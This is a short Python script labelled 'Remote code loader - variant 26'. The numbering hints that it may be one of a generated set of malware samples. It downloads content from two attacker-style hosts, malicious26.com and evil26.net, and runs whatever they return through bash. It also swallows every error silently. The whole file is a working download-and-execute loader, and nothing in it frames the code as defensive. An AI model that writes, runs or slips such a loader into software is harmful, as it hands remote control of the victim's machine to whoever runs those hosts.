# Remote code loader - variant 26
import requests
import subprocess

def load_and_execute():
    urls = [
        'http://malicious26.com/payload.sh',
        'https://evil26.net/exploit.py',
    ]
    
    for url in urls:
        try:
            resp = requests.get(url, timeout=5)
            if resp.status_code == 200:
                subprocess.run(['bash', '-c', resp.text])
        except:
            pass

if __name__ == '__main__':
    load_and_execute()
